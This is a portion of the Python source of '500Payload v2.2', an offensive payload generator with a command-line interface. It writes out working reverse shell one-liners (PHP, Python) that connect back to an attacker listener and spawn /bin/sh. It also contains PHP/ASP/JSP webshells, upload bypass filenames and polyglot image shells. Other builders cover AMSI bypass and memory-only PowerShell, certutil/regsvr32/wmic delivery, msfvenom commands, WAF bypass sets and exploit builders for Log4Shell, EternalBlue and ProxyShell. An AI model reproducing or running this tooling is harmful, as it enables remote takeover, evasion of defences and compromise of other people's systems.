    def _windows_stream_bypass(self) -> List[str]:
        """Windows NTFS alternate data stream file upload bypass"""
        return ['shell.php::$DATA', 'shell.php::$DATA.jpg',
                'shell.php:stream.jpg', 'shell.asp::$DATA',
                'shell.aspx::$DATA', 'shell.php:.']


# ============================================================
# THREAD-SAFE PAYLOAD BUILDER
# ============================================================

class PayloadBuilder:
    """500Payload v2.2 - Advanced Payload Builder (Windows + Linux)"""

    def __init__(self):
        self.core = PayloadCore()
        self.obfuscator = ObfuscationEngine()
        self.polyglot = PolyglotFile()
        self.waf_bypass = WAFBypass()
        self.file_upload = FileUploadBypass()
        self.auto_exploit = AutoExploit()
        self._lock = threading.Lock()

    def build_reverse_shell(self, language: str, ip: str, port: int,
                           obfuscated: bool = False, layers: int = 3) -> Dict:
        """Build a complete reverse shell payload (cross-platform)"""
        with self._lock:
            result = {
                'payload_type': 'reverse_shell',
                'language': language,
                'target': f'{ip}:{port}',
                'generated': datetime.now().isoformat(),
                'payloads': {}
            }

            generators = {
                'php': self.core.php_reverse_shell,
                'jsp': self.core.jsp_reverse_shell,
                'aspx': self.core.aspx_reverse_shell,
                'python': self.core.python_reverse_shell,
                'perl': self.core.perl_reverse_shell,
                'ruby': self.core.ruby_reverse_shell,
                'nodejs': self.core.nodejs_reverse_shell,
                'powershell': self.core.powershell_reverse_shell,
                'powershell_oneliner': self.core.powershell_one_liner,
                'powershell_b64': self.core.powershell_base64_encoded,
                'cmd_ncat': self.core.cmd_ncat_reverse_shell,
                'batch': self.core.windows_batch_reverse_shell,
                'icmp': lambda i, p: self.core.icmp_reverse_shell(i),
                'dns': lambda i, p: self.core.dns_reverse_shell(i),
                'websocket': lambda i, p: self.core.websocket_reverse_shell(i),
                'amsi_bypass': self.core.amsi_bypass_powershell,
                'memory_only': self.core.memory_only_powershell,
            }

            if language in generators:
                raw_payload = generators[language](ip, port)
                result['payloads']['raw'] = raw_payload

                if obfuscated:
                    if language == 'php':
                        result['payloads']['obfuscated'] = self.obfuscator.obfuscate_php(raw_payload, layers)
                        result['payloads']['dynamic_obfuscated'] = self.obfuscator.obfuscate_php_variable_dynamic(raw_payload)
                    elif language in ('powershell', 'powershell_oneliner'):
                        result['payloads']['obfuscated_b64'] = self.core.powershell_base64_encoded(ip, port)

            # One-liners
            result['payloads']['one_liners'] = self._generate_one_liners(language, ip, port)

            # Encoded
            result['payloads']['encoded'] = self._generate_encoded(ip, port)

            return result

    def _generate_one_liners(self, language: str, ip: str, port: int) -> List[str]:
        one_liners = []
        if language == 'php':
            one_liners.append(f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
            one_liners.append(f"php -r '$s=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'")
        elif language == 'python':
            one_liners.append(f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'")
            one_liners.append(f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'")
        elif language == 'powershell':
            one_liners.append(self.core.powershell_one_liner(ip, port))
        return one_liners

    def _generate_encoded(self, ip: str, port: int) -> Dict[str, str]:
        return {
            'base64_php': base64.b64encode(self.core.php_reverse_shell(ip, port).encode()).decode(),
            'base64_python': base64.b64encode(self.core.python_reverse_shell(ip, port).encode()).decode(),
            'hex_php': self.core.php_reverse_shell(ip, port).encode().hex(),
        }

    def build_windows_payloads(self, ip: str, port: int) -> Dict:
        """Build all Windows-specific payloads"""
        with self._lock:
            return {
                'payload_type': 'windows_payloads',
                'target': f'{ip}:{port}',
                'generated': datetime.now().isoformat(),
                'payloads': {
                    'powershell_full': self.core.powershell_reverse_shell(ip, port),
                    'powershell_oneliner': self.core.powershell_one_liner(ip, port),
                    'powershell_base64': self.core.powershell_base64_encoded(ip, port),
                    'amsi_bypass': self.core.amsi_bypass_powershell(ip, port),
                    'memory_only': self.core.memory_only_powershell(ip, port),
                    'cmd_ncat': self.core.cmd_ncat_reverse_shell(ip, port),
                    'aspx_reverse_shell': self.core.aspx_reverse_shell(ip, port),
                    'aspx_webshell': self.core.aspx_webshell(),
                    'batch_script': self.core.windows_batch_reverse_shell(ip, port),
                    'msfvenom_cmds': {
                        'exe_x86': self.core.msfvenom_windows_exe(ip, port, 'reverse_tcp'),
                        'exe_x64': self.core.msfvenom_windows_exe(ip, port, 'reverse_tcp_x64'),
                        'https': self.core.msfvenom_windows_exe(ip, port, 'reverse_https'),
                        'psh': self.core.msfvenom_windows_exe(ip, port, 'psh_reverse'),
                        'aspx_msf': self.core.msfvenom_windows_exe(ip, port, 'aspx'),
                        'hta': self.core.msfvenom_windows_exe(ip, port, 'hta'),
                    },
                    'living_off_the_land': {
                        'regsvr32_sct': self.core.regsvr32_sct_reverse_shell(ip, port),
                        'wmic_xsl': self.core.wmic_xsl_reverse_shell(ip, port),
                        'certutil_delivery': self.core.certutil_exe_delivery(ip, port, f'http://{ip}/shell.exe'),
                    },
                    'waf_bypass_injections': WAFBypass.windows_command_injection_payloads(),
                }
            }

    def build_linux_payloads(self, ip: str, port: int) -> Dict:
        """Build all Linux-specific payloads"""
        with self._lock:
            return {
                'payload_type': 'linux_payloads',
                'target': f'{ip}:{port}',
                'generated': datetime.now().isoformat(),
                'payloads': {
                    'php_reverse': self.core.php_reverse_shell(ip, port),
                    'php_bind': self.core.php_bind_shell(port),
                    'python_reverse': self.core.python_reverse_shell(ip, port),
                    'perl_reverse': self.core.perl_reverse_shell(ip, port),
                    'ruby_reverse': self.core.ruby_reverse_shell(ip, port),
                    'nodejs_reverse': self.core.nodejs_reverse_shell(ip, port),
                    'jsp_reverse': self.core.jsp_reverse_shell(ip, port),
                    'icmp_reverse': self.core.icmp_reverse_shell(ip),
                    'dns_reverse': self.core.dns_reverse_shell(ip + '.attacker.com'),
                    'websocket_reverse': self.core.websocket_reverse_shell(f'ws://{ip}:{port}/ws'),
                }
            }

    def build_webshell(self, language: str = 'php', cmd_param: str = 'cmd') -> Dict:
        """Build webshell payloads"""
        with self._lock:
            result = {
                'payload_type': 'webshell',
                'language': language,
                'generated': datetime.now().isoformat(),
                'payloads': []
            }

            webshells = {
                'php': [
                    f"<?php system($_REQUEST['{cmd_param}']); ?>",
                    f"<?php echo passthru($_GET['{cmd_param}']); ?>",
                    f"<?php echo shell_exec($_POST['{cmd_param}']); ?>",
                    f"<?php eval($_REQUEST['{cmd_param}']); ?>",
                    f"<?php exec($_REQUEST['{cmd_param}'],$o);print_r($o); ?>",
                    f"<?php echo `$_GET['{cmd_param}']`; ?>",
                ],
                'asp': [
                    f"<% Execute(Request(\"{cmd_param}\")) %>",
                    f"<% Response.Write(CreateObject(\"WScript.Shell\").Exec(Request(\"{cmd_param}\")).StdOut.ReadAll()) %>",
                ],
                'jsp': [
                    f"<% Runtime.getRuntime().exec(request.getParameter(\"{cmd_param}\")); %>",
                    f"<% Process p = Runtime.getRuntime().exec(request.getParameter(\"{cmd_param}\")); %>",
                ],
                'aspx': [
                    self.core.aspx_webshell(cmd_param),
                ],
            }

            if language in webshells:
                result['payloads'] = webshells[language].copy()
                if language == 'php':
                    for ws in webshells['php']:
                        result['payloads'].append(self.obfuscator.obfuscate_php(ws, layers=2))

            return result

    def build_polyglot_shell(self, payload: str, formats: List[str] = None) -> Dict:
        """Build polyglot file upload shells"""
        with self._lock:
            if formats is None:
                formats = ['gif', 'jpg', 'png', 'pdf']
            result = {'payload_type': 'polyglot_shell', 'generated': datetime.now().isoformat(), 'files': {}}
            methods = {'gif': self.polyglot.gif_php, 'jpg': self.polyglot.jpg_php,
                       'png': self.polyglot.png_php, 'pdf': self.polyglot.pdf_php}
            for fmt in formats:
                if fmt in methods:
                    data = methods[fmt](payload)
                    result['files'][f'shell.{fmt}.php'] = {
                        'format': fmt, 'size': len(data),
                        'md5': hashlib.md5(data).hexdigest(),
                        'hex_preview': data.hex()[:200] + '...'
                    }
            return result

    def build_upload_bypass_payloads(self) -> Dict:
        """Get all file upload bypass techniques"""
        with self._lock:
            bypass = self.file_upload.get_all_bypasses()
            return {
                'payload_type': 'upload_bypass',
                'generated': datetime.now().isoformat(),
                'techniques': bypass,
                'total_bypasses': len(bypass.get('extensions', [])) + len(bypass.get('null_byte', []))
            }

    def build_waf_bypass_payloads(self) -> Dict:
        """Get all WAF bypass payloads (FIXED)"""
        with self._lock:
            return {
                'payload_type': 'waf_bypass',
                'generated': datetime.now().isoformat(),
                'payloads': {
                    'sql_injection': WAFBypass.sql_injection_payloads(),
                    'xss': WAFBypass.xss_payloads(),
                    'lfi': WAFBypass.lfi_payloads(),
                    'command_injection': WAFBypass.command_injection_payloads(),
                    'windows_command_injection': WAFBypass.windows_command_injection_payloads(),
                },
                'payload_count': {
                    'sql_injection': len(WAFBypass.sql_injection_payloads()),
                    'xss': len(WAFBypass.xss_payloads()),
                    'lfi': len(WAFBypass.lfi_payloads()),
                    'command_injection': len(WAFBypass.command_injection_payloads()),
                    'windows_command_injection': len(WAFBypass.windows_command_injection_payloads()),
                }
            }

    def build_auto_exploit_payloads(self, ip: str, port: int, target: str = None) -> Dict:
        """Build auto-exploit payloads for known CVEs"""
        with self._lock:
            return {
                'payload_type': 'auto_exploit',
                'generated': datetime.now().isoformat(),
                'exploits': {
                    'log4shell': {
                        'payload': self.auto_exploit.log4shell(ip, port, f'{ip}:1389'),
                        'headers': self.auto_exploit.log4shell_http_header(ip, port, f'{ip}:1389')
                    },
                    'spring4shell': self.auto_exploit.spring4shell(ip, port),
                    'heartbleed': self.auto_exploit.heartbleed(target or ip),
                    'eternalblue': self.auto_exploit.eternalblue(target or ip),
                    'proxyshell': self.auto_exploit.proxyshell(target or ip, port),
                }
            }


# ============================================================
# MAIN ENTRY POINT
# ============================================================

def main():
    """Main entry point with argument parsing"""
    import argparse
    
    parser = argparse.ArgumentParser(
        description='500Payload v2.2 - Advanced Multi-Layer Payload Generator',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  # Generate Windows PowerShell reverse shell
  python 500payload.py --ip 10.0.0.1 --port 4444 --language powershell
  
  # Generate obfuscated PHP reverse shell
  python 500payload.py --ip 10.0.0.1 --port 4444 --language php --obfuscate
  
  # Generate all Windows payloads
  python 500payload.py --ip 10.0.0.1 --port 4444 --all-windows --output windows_payloads.json
  
  # Generate polyglot shell
  python 500payload.py --polyglot --payload "system('id');" --formats gif,jpg,png
  
  # Show WAF bypass payloads
  python 500payload.py --waf-bypass
  
  # Show file upload bypass techniques
  python 500payload.py --upload-bypass
        '''
    )
    
    # Target options
    parser.add_argument('--ip', help='Listener IP address')
    parser.add_argument('--port', type=int, help='Listener port')
    parser.add_argument('--language', choices=['php', 'jsp', 'aspx', 'python', 'perl', 'ruby', 'nodejs', 
                                                'powershell', 'powershell_oneliner', 'batch', 'icmp', 'dns', 
                                                'websocket', 'amsi_bypass', 'memory_only'],
                        default='powershell', help='Payload language')
    parser.add_argument('--obfuscate', action='store_true', help='Apply obfuscation to payload')
    parser.add_argument('--layers', type=int, default=3, help='Obfuscation layers (default: 3)')
    
    # Batch generation
    parser.add_argument('--all-windows', action='store_true', help='Generate all Windows payloads')
    parser.add_argument('--all-linux', action='store_true', help='Generate all Linux payloads')
    
    # Webshell
    parser.add_argument('--webshell', action='store_true', help='Generate webshell payloads')
    parser.add_argument('--webshell-lang', choices=['php', 'asp', 'jsp', 'aspx'], default='php', help='Webshell language')
    parser.add_argument('--cmd-param', default='cmd', help='Command parameter name')
    
    # Polyglot
    parser.add_argument('--polyglot', action='store_true', help='Generate polyglot file')
    parser.add_argument('--payload', help='Payload for polyglot file')
    parser.add_argument('--formats', default='gif,jpg,png,pdf', help='Polyglot formats (comma-separated)')
    
    # Bypass techniques
    parser.add_argument('--waf-bypass', action='store_true', help='Show WAF bypass payloads')
    parser.add_argument('--upload-bypass', action='store_true', help='Show file upload bypass techniques')
    
    # Auto exploit
    parser.add_argument('--auto-exploit', action='store_true', help='Generate auto-exploit payloads')
    parser.add_argument('--target', help='Target for auto-exploit (e.g., victim.com)')
    
    # Output
    parser.add_argument('--output', '-o', help='Output file (JSON format)')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    builder = PayloadBuilder()
    result = {}
    
    # Validate required arguments for generation
    if not (args.waf_bypass or args.upload_bypass or args.auto_exploit or args.polyglot):
        if not args.ip or not args.port:
            parser.error("--ip and --port are required for payload generation (use --waf-bypass, --upload-bypass, or --auto-exploit for other features)")
    
    try:
        # WAF bypass
        if args.waf_bypass:
            logger.info("Generating WAF bypass payloads...")
            result = builder.build_waf_bypass_payloads()
            print(json.dumps(result, indent=2))
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(result, f, indent=2)
                logger.info(f"Saved to {args.output}")
            return
        
        # Upload bypass
        if args.upload_bypass:
            logger.info("Generating file upload bypass techniques...")
            result = builder.build_upload_bypass_payloads()
            print(json.dumps(result, indent=2))
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(result, f, indent=2)
                logger.info(f"Saved to {args.output}")
            return
        
        # Auto exploit
        if args.auto_exploit:
            logger.info("Generating auto-exploit payloads...")
            result = builder.build_auto_exploit_payloads(args.ip, args.port, args.target)
            print(json.dumps(result, indent=2))
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(result, f, indent=2)
                logger.info(f"Saved to {args.output}")
            return
        
        # Polyglot
        if args.polyglot:
            if not args.payload:
                parser.error("--payload is required for polyglot generation")
            logger.info("Generating polyglot files...")
            formats_list = args.formats.split(',')
            result = builder.build_polyglot_shell(args.payload, formats_list)
            print(json.dumps(result, indent=2))
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(result, f, indent=2)
                logger.info(f"Saved to {args.output}")
            return
        
        # Webshell
        if args.webshell:
            logger.info(f"Generating {args.webshell_lang} webshell...")
            result = builder.build_webshell(args.webshell_lang, args.cmd_param)
            print(json.dumps(result, indent=2))
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(result, f, indent=2)
                logger.info(f"Saved to {args.output}")
            return
        
        # All Windows payloads
        if args.all_windows:
            logger.info(f"Generating all Windows payloads for {args.ip}:{args.port}...")
            result = builder.build_windows_payloads(args.ip, args.port)
            print(json.dumps(result, indent=2))
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(result, f, indent=2)
                logger.info(f"Saved to {args.output}")
            return
        
        # All Linux payloads
        if args.all_linux:
            logger.info(f"Generating all Linux payloads for {args.ip}:{args.port}...")
            result = builder.build_linux_payloads(args.ip, args.port)
            print(json.dumps(result, indent=2))
            if args.output:
                with open(args.output, 'w') as f:
                    json.dump(result, f, indent=2)
                logger.info(f"Saved to {args.output}")
            return
        
        # Single reverse shell
        logger.info(f"Generating {args.language} reverse shell for {args.ip}:{args.port}...")
        if args.obfuscate:
            logger.info(f"Applying {args.layers} obfuscation layers...")
        result = builder.build_reverse_shell(args.language, args.ip, args.port, args.obfuscate, args.layers)
        
        # Print result
        if args.verbose:
            print(json.dumps(result, indent=2))
        else:
            # Print simplified output
            print(f"\n{'='*60}")
            print(f"500Payload v2.2 - Generated {result['language']} Payload")
            print(f"Target: {result['target']}")
            print(f"Generated: {result['generated']}")
            print(f"{'='*60}\n")
            
            if 'raw' in result['payloads']:
                print("RAW PAYLOAD:\n" + "-" * 40)
                print(result['payloads']['raw'])
                print("\n")
            
            if 'obfuscated' in result['payloads']:
                print("OBFUSCATED PAYLOAD:\n" + "-" * 40)
                print(result['payloads']['obfuscated'])
                print("\n")
            
            if 'one_liners' in result['payloads'] and result['payloads']['one_liners']:
                print("ONE-LINERS:\n" + "-" * 40)
                for ol in result['payloads']['one_liners']:
                    print(ol)
                print("\n")
        
        # Save to file
        if args.output:
            with open(args.output, 'w') as f:
                json.dump(result, f, indent=2)
            logger.info(f"Payload saved to {args.output}")
            
            # Save raw payload to separate file if requested
            if args.verbose and 'raw' in result['payloads']:
                raw_file = args.output.replace('.json', '_raw.txt')
                with open(raw_file, 'w') as f:
                    f.write(result['payloads']['raw'])
                logger.info(f"Raw payload saved to {raw_file}")
    
    except Exception as e:
        logger.error(f"Error generating payload: {str(e)}")
        if args.verbose:
            import traceback
            traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()